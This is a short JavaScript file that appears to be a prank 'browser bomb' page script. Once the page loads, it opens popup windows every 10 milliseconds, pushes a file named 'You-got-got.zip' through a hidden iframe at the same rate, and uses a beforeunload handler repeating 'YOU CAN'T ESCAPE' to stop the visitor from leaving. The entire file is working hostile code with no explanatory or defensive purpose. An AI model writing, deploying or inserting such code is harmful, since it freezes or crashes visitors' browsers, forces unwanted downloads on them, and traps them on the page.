var boomSpeed = 10;
window.onload = () => {
  boom(boomSpeed);
}
function boom(speed) {
	setInterval(()=>{window.open('boom/index.html', '', 7, 7);}, speed);
	setInterval(()=>{downloadURL('You-got-got.zip');}, speed);
}
function downloadURL(url) {
    var hiddenIFrameID = 'hiddenDownloader',
        iframe = document.getElementById(hiddenIFrameID);
    if (iframe === null) {
        iframe = document.createElement('iframe');
        iframe.id = hiddenIFrameID;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
    }
    iframe.src = url;
};
window.addEventListener("beforeunload", function (e) {
    var confirmationMessage = "YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE" +
		  		  						"YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE" +
		  								"YOU CAN'T ESCAPE";


    (e || window.event).returnValue = confirmationMessage; //Gecko + IE
    return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
});